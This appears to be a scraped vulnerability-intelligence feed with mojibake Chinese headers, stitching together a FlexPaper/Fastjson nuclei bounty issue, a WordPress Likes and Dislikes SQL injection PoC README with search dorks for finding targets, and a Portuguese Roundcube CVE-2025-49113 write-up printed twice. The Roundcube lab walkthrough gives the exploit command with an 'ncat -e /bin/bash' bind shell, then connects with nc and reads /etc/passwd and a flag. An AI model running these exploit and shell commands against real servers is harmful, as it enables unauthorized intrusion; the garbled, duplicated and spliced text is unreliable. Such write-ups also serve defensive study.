entry.content:

æ¼æ´åç§°ï¼š FlexPaper Remote Code Execution Vulnerability

æ¼æ´ç¼–å·ï¼š

  • CVEï¼š CVE-2018-11686

æ¼æ´ç±»å‹ï¼š å‘½ä»¤æ‰§è¡Œ

æ¼æ´ç­‰çº§ï¼š ä¸¥é‡

æ¼æ´æè¿°ï¼š FlexPaper (FlowPaper) 2.3.6ç‰ˆæœ¬ä¸­çš„setup.phpå’Œchange_config.phpæ–‡ä»¶å­˜åœ¨ä¸å®‰å…¨å¤„ç†ï¼Œå¯¼è‡´è¿œç¨‹æ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚åˆ©ç”¨æ­¤æ¼æ´éœ€è¦èƒ½å¤Ÿè®¿é—®è¿™äº›è„šæœ¬ã€‚

äº§å“å‚å•†ï¼š FlexPaper

äº§å“åç§°ï¼š FlexPaper (FlowPaper)

å½±å“ç‰ˆæœ¬ï¼š 2.3.6

æ¥æºï¼š https://github.com/projectdiscovery/nuclei-templates/issues/12369

ç±»å‹ï¼š projectdiscovery/nuclei-templates:github issues

æ¥æºæ¦‚è¿°

Description:

FlexPaper (FlowPaper) 2.3.6 contains a remote code execution caused by insecure handling in setup.php and change_config.php, letting remote attackers execute arbitrary code, exploit requires access to these scripts.

Severity: Critical
POC:
  • https://redtimmysec.wordpress.com/2019/03/07/flexpaper-remote-code-execution
  • https://vulncheck.com/xdb/b67f601a7711
  • https://github.com/mpgn/CVE-2018-11686
  • https///github.com:mpgn/CVE-2018-11686.git

KEV: True

Shodan Query: NA

Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file.

Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and wonâ€™t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

You can check the FAQ for the Nuclei Templates Community Rewards Program here.

Description:

Fastjson before 1.2.25 contains a remote code execution caused by unsafe deserialization in parseObject, letting remote attackers execute arbitrary code via crafted JSON data, exploit requires sending malicious JSON payload to /json endpoint.

Severity: Critical
POC:
  • https://github.com/pippo-java/pippo/issues/466
  • https://github.com/h0cksr/Fastjson--CVE-2017-18349-

KEV: True

Shodan Query: NA

Such templates are blocked by default and wonâ€™t produce results, so we prioritize creating templates with other protocols unless exceptions are made.

æ¼æ´ç±»å‹ï¼š SQLæ³¨å…¥

æ¼æ´ç­‰çº§ï¼š é«˜å±

æ¼æ´æè¿°ï¼š WordPress Likes and Dislikes Plugin â‰¤ 1.0.0ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªæœªè®¤è¯çš„SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡my_likes_dislikes_action AJAXåŠ¨ä½œä¸­çš„postå‚æ•°è¿›è¡ŒåŸºäºæ—¶é—´çš„ç›²æ³¨ï¼Œå¯èƒ½å¯¼è‡´æ•æ„Ÿæ•°æ®æ³„éœ²æˆ–è¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚

äº§å“å‚å•†ï¼š WordPress

äº§å“åç§°ï¼š WordPress Likes and Dislikes Plugin

å½±å“ç‰ˆæœ¬ï¼š â‰¤ 1.0.0

æœç´¢è¯­æ³•ï¼š body=â€/wp-admin/admin-ajax.phpâ€ or body=â€my_likes_dislikes_actionâ€

æ¥æºï¼š https://github.com/RootHarpy/CVE-2025-5287

ç±»å‹ï¼š CVE-2025:github search

ä»“åº“æ–‡ä»¶

  • CVE-2025-5287.py
  • README.md

æ¥æºæ¦‚è¿°

CVE-2025-5287 PoC

Unauthenticated SQL Injection exploit for WordPress Likes and Dislikes Plugin â‰¤ 1.0.0

ğŸ“– Description

This Python script is a proof-of-concept (PoC) exploit for CVE-2025-5287, targeting a vulnerability in the WordPress Likes and Dislikes Plugin â‰¤ 1.0.0.
The vulnerability allows unauthenticated attackers to perform time-based blind SQL injection via the post parameter in the my_likes_dislikes_action AJAX action, potentially leading to sensitive data exposure or further exploitation.

ğŸ“Œ Usage

â–¶ï¸ Requirements:

  • Python 3
  • requests library

Install required libraries:

Arguments:

  • --url / -u : Target WordPress site URL (with HTTP/HTTPS)
  • --sleep / -s : Sleep time (seconds) for detecting SQL delay (default: 5)

â–¶ï¸ Run the Exploit:

Or with a custom sleep time:

ğŸ” Finding Targets

You can use Fofa to discover potentially vulnerable WordPress installations running the plugin.

Fofa Dork:

Or to narrow down plugin-specific references:

Search on: https://fofa.info

ğŸ‘¨â€ğŸ’» Author

Md Shoriful Islam (RootHarpy)

ğŸ“œ Disclaimer

This tool is created for educational and authorized penetration testing purposes only. Unauthorized use of this tool against systems without explicit permission is illegal.

entry.title: Roundcube ååºåˆ—åŒ–æ¼æ´
entry.content:
æ¼æ´ä¿¡æ¯

æ¼æ´åç§°ï¼š Roundcube ååºåˆ—åŒ–æ¼æ´

æ¼æ´ç¼–å·ï¼š

  • CVEï¼š CVE-2025-49113

æ¼æ´ç±»å‹ï¼š ååºåˆ—åŒ–

æ¼æ´ç­‰çº§ï¼š é«˜å±

æ¼æ´æè¿°ï¼š Roundcubeé‚®ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨ç™»å½•åæ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚å—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬1.5.10åŠä»¥ä¸‹å’Œ1.6.10åŠä»¥ä¸‹ã€‚æ¼æ´æºäºprogram/actions/settings/upload.phpæ–‡ä»¶ä¸­å¯¹_fromå‚æ•°çš„å¤„ç†ä¸å½“ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„è¯·æ±‚æ‰§è¡Œä»»æ„ä»£ç ã€‚

äº§å“å‚å•†ï¼š Roundcube

äº§å“åç§°ï¼š Roundcube

å½±å“ç‰ˆæœ¬ï¼š â‰¤ 1.5.10 / 1.6.10

æ¥æºï¼š https://github.com/5kr1pt/WriteUp-Roundcube_CVE-2025-49113

ç±»å‹ï¼š CVE-2025:github search

ä»“åº“æ–‡ä»¶

  • README.md
  • images

æ¥æºæ¦‚è¿°

CVE-2025-49113 â€“ dez anos â€œem silÃªncioâ€ atÃ© virar RCE no Roundcube

Impacto: execuÃ§Ã£o remota de comandos pÃ³s-login (CVSS 9.9)
VersÃµes afetadas: â‰¤ 1.5.10 / 1.6.10
Patched: 1.5.11 e 1.6.11

1 â€“ Linha do tempo rÃ¡pida

DataEvento
~2014IntroduÃ§Ã£o da rota program/actions/settings/upload.php com uso de session->append() sem validaÃ§Ã£o.
03 jun 2025Pesquisadores da FearsOff publicam o advisory e anunciam PoC.
04 jun 2025Roundcube aplica commit 0376f69 (1.6-stable) e commit 7408f31 (1.5-lts).
06 jun 2025PoC universal em PHP publicada em GitHub . (fearsoff-org/CVE-2025-49113)
10 jun 2025Primeiros relatos de exploraÃ§Ã£o em massa.

2 â€“ Onde estava o problema

CÃ³digo vulnerÃ¡vel (1.6.10)

A entrada _from chega Ã­ntegra do GET, vira parte do nome de um nÃ³ na sessÃ£o e,
durante o primeiro append(), o Roundcube faz:

Se o arquivo existir, o RCE funcionou.

6 â€“ MitigaÃ§Ãµes

  1. Atualize imediatamente para â‰¥ 1.6.11 ou â‰¥ 1.5.11.

  2. Sem update? Bloqueie qualquer _from contendo %22, %7C, !, . ou bytes de controle via WAF ou rewrite.

  3. Desative funÃ§Ãµes perigosas (proc_open, exec, etc.) em php.ini quando possÃ­vel.

  4. Restrinja uploads no painel de configuraÃ§Ãµes e monitore logs.

7 - Lab - TryHackme - WriteUp

1. Recon

  1. Abrir a VM (MACHINE_IP) e o AttackBox.

  2. Acessar http://MACHINE_IP/roundcube com:

    usuÃ¡rio: ellieptic
    senha: ChangeMe123

    Isso vai funcionar e vai logar normalmente:

2. Montar o exploit

ApÃ³s verificar que estÃ¡ tudo up, vamos executar o exploit, para isso vamos acessar a PoC postada no github informada anteriormente e fazer um gitclone:

3. Preparar o payload

O uso do payload Ã© simples, basta criar o bind shell e apontar para uma porta com o file .php seguindo o usage abaixo:

php CVE-2025-49113.php <site> <user> <senha> â€œ<bind shell>â€

php CVE-2025-49113.php http://MACHINE_IP/roundcube ellieptic ChangeMe123 "ncat -lvnp 1337 -e /bin/bash"

â€“ O script faz login, injeta o objeto PHP malicioso no parÃ¢metro _from, conforme falamos anteriormente, chama o endpoint upload.php e depois forÃ§a logout para disparar
session_decode() â†’ unserialize() â†’ proc_open().

Ã€s vezes ele mostra erro de CSRF; ignore e siga para o prÃ³ximo passo,
porque o comando costuma ter sido executado mesmo assim.

4. Conectar na shell

Se a bind shell deu certo, ela ta escutando na porta 1337 que passamos, so fazermos a conexÃ£o nela agora:

nc MACHINE_IP 1337

Shell obtida.

5. Respondendo as questÃµes

QuestÃµes e respostas

  1. UsuÃ¡rio Maggie
    Pergunta: Um dos usuÃ¡rios tem o primeiro nome Maggie. Qual Ã© o sobrenome dela?
    Resposta: Byte

Para resolver essa questÃ£o podiamos dar um cat em /etc/passwd grepando o usuÃ¡rio da maggie, ou simplesmente dando um lsem /home

  1. Flag em /etc
    Pergunta: Qual Ã© o valor do sinalizador salvo em /etc?
    Resposta: THM{ICE_CUBE_DESERIALISATION}

Para resolver isso, dei um cat /etc/flag* e por sorte o nome do arquivo era flag e com isso conseguimos capturar.

7 â€“ ReferÃªncias

  • Commit 1.6.11 â€“ https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d

  • Commit 1.5.11 â€“ https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695

  • FearsOff write-up â€“ https://fearsoff.org/research/roundcube

  • OffSec blog â€“ https://www.offsec.com/blog/cve-2025-49113/ offsec.com

  • TryHackme - TryHackMe | Roundcube: CVE-2025-49113

entry.title: Roundcube ååºåˆ—åŒ–æ¼æ´
entry.content:
æ¼æ´ä¿¡æ¯

æ¼æ´åç§°ï¼š Roundcube ååºåˆ—åŒ–æ¼æ´

æ¼æ´ç¼–å·ï¼š

  • CVEï¼š CVE-2025-49113

æ¼æ´ç±»å‹ï¼š ååºåˆ—åŒ–

æ¼æ´ç­‰çº§ï¼š é«˜å±

æ¼æ´æè¿°ï¼š Roundcubeé‚®ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨ç™»å½•åæ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚è¯¥æ¼æ´å½±å“ç‰ˆæœ¬1.5.10åŠä»¥ä¸‹å’Œ1.6.10åŠä»¥ä¸‹ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„_fromå‚æ•°ï¼Œåˆ©ç”¨session->append()å‡½æ•°çš„ä¸å½“ä½¿ç”¨ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

äº§å“å‚å•†ï¼š Roundcube

äº§å“åç§°ï¼š Roundcube

å½±å“ç‰ˆæœ¬ï¼š â‰¤ 1.5.10 / 1.6.10

æ¥æºï¼š https://github.com/5kr1pt/CVE-2025-49113

ç±»å‹ï¼š CVE-2025:github search

ä»“åº“æ–‡ä»¶

  • Pastedimage20250616175835.png
  • Pastedimage20250616180500.png
  • Pastedimage20250616180745.png
  • Pastedimage20250616180844.png
  • Pastedimage20250616181115.png
  • Pastedimage20250616181246.png
  • README.md

æ¥æºæ¦‚è¿°

CVE-2025-49113 â€“ dez anos â€œem silÃªncioâ€ atÃ© virar RCE no Roundcube

Impacto: execuÃ§Ã£o remota de comandos pÃ³s-login (CVSS 9.9)
VersÃµes afetadas: â‰¤ 1.5.10 / 1.6.10
Patched: 1.5.11 e 1.6.11

1 â€“ Linha do tempo rÃ¡pida

DataEvento
~2014IntroduÃ§Ã£o da rota program/actions/settings/upload.php com uso de session->append() sem validaÃ§Ã£o.
03 jun 2025Pesquisadores da FearsOff publicam o advisory e anunciam PoC.
04 jun 2025Roundcube aplica commit 0376f69 (1.6-stable) e commit 7408f31 (1.5-lts).
06 jun 2025PoC universal em PHP publicada em GitHub . (fearsoff-org/CVE-2025-49113)
10 jun 2025Primeiros relatos de exploraÃ§Ã£o em massa.

2 â€“ Onde estava o problema

CÃ³digo vulnerÃ¡vel (1.6.10)

A entrada _from chega Ã­ntegra do GET, vira parte do nome de um nÃ³ na sessÃ£o e,
durante o primeiro append(), o Roundcube faz:

Se o arquivo existir, o RCE funcionou.

6 â€“ MitigaÃ§Ãµes

  1. Atualize imediatamente para â‰¥ 1.6.11 ou â‰¥ 1.5.11.

  2. Sem update? Bloqueie qualquer _from contendo %22, %7C, !, . ou bytes de controle via WAF ou rewrite.

  3. Desative funÃ§Ãµes perigosas (proc_open, exec, etc.) em php.ini quando possÃ­vel.

  4. Restrinja uploads no painel de configuraÃ§Ãµes e monitore logs.

7 - Lab - TryHackme - WriteUp

1. Recon

  1. Abrir a VM (MACHINE_IP) e o AttackBox.

  2. Acessar http://MACHINE_IP/roundcube com:

    usuÃ¡rio: ellieptic
    senha: ChangeMe123

    Isso vai funcionar e vai logar normalmente:

2. Montar o exploit

ApÃ³s verificar que estÃ¡ tudo up, vamos executar o exploit, para isso vamos acessar a PoC postada no github informada anteriormente e fazer um gitclone:

3. Preparar o payload

O uso do payload Ã© simples, basta criar o bind shell e apontar para uma porta com o file .php seguindo o usage abaixo:

php CVE-2025-49113.php <site> <user> <senha> â€œ<bind shell>â€

php CVE-2025-49113.php http://MACHINE_IP/roundcube ellieptic ChangeMe123 "ncat -lvnp 1337 -e /bin/bash"

â€“ O script faz login, injeta o objeto PHP malicioso no parÃ¢metro _from, conforme falamos anteriormente, chama o endpoint upload.php e depois forÃ§a logout para disparar
session_decode() â†’ unserialize() â†’ proc_open().

Ã€s vezes ele mostra erro de CSRF; ignore e siga para o prÃ³ximo passo,
porque o comando costuma ter sido executado mesmo assim.

4. Conectar na shell

Se a bind shell deu certo, ela ta escutando na porta 1337 que passamos, so fazermos a conexÃ£o nela agora:

nc MACHINE_IP 1337

Shell obtida.

5. Respondendo as questÃµes

QuestÃµes e respostas

  1. UsuÃ¡rio Maggie
    Pergunta: Um dos usuÃ¡rios tem o primeiro nome Maggie. Qual Ã© o sobrenome dela?
    Resposta: Byte

Para resolver essa questÃ£o podiamos dar um cat em /etc/passwd grepando o usuÃ¡rio da maggie, ou simplesmente dando um lsem /home

  1. Flag em /etc
    Pergunta: Qual Ã© o valor do sinalizador salvo em /etc?
    Resposta: THM{ICE_CUBE_DESERIALISATION}
    Para resolver isso, dei um cat /etc/flag* e por sorte o nome do arquivo era flag e com isso conseguimos capturar.

7 â€“ ReferÃªncias

  • Commit 1.6.11 â€“ https://github.com/roundcube/roundcubemail/commit/0376f69e958a8fef7f6f09e352c541b4e7729c4d

  • Commit 1.5.11 â€“ https://github.com/roundcube/roundcubemail/commit/7408f31379666124a39f9cb1018f62bc5e2dc695

  • FearsOff write-up â€“ https://fearsoff.org/research/roundcube

  • OffSec blog â€“ https://www.offsec.com/blog/cve-2025-49113/ offsec.com

  • TryHackme - TryHackMe | Roundcube: CVE-2025-49113

  • GHSA advisory â€“ https://github.com/advisories/GHSA-8j8w-wwqc-x596 github.com
